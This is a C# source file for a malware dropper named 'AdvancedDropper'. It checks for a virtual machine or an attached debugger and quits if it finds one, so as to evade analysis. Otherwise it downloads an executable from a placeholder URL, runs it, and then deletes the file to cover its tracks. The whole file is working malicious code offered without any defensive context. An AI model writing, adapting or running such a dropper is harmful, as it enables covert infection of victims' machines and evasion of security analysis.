using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace AdvancedDropper
{
    class Program
    {
        static string DropperFilePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
        static string PayloadUrl = "http://example.com/payload.exe";

        static void Main(string[] args)
        {
            try
            {
                if (IsVirtualMachine() || Debugger.IsAttached)
                {
                    return;
                }

                DownloadAndExecutePayload();
                CleanUp();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static void DownloadAndExecutePayload()
        {
            string payloadFilePath = Path.Combine(DropperFilePath, Path.GetFileName(PayloadUrl));

            using (HttpClient httpClient = new HttpClient())
            {
                using (Stream responseStream = httpClient.GetStreamAsync(PayloadUrl).Result)
                {
                    using (FileStream fileStream = new FileStream(payloadFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        responseStream.CopyTo(fileStream);
                    }
                }
            }

            using (Process process = new Process())
            {
                process.StartInfo.FileName = payloadFilePath;
                process.Start();
            }
        }

        private static void CleanUp()
        {
            string payloadFilePath = Path.Combine(DropperFilePath, Path.GetFileName(PayloadUrl));
            if (File.Exists(payloadFilePath))
            {
                File.Delete(payloadFilePath);
            }
        }

        private static bool IsVirtualMachine()
        {
            return IsWindowsHypervisorPresent();
        }

        private static bool IsWindowsHypervisorPresent()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization"))
            {
                return key != null && key.GetValue("VirtualizationEnabled") != null;
            }
        }
    }
}

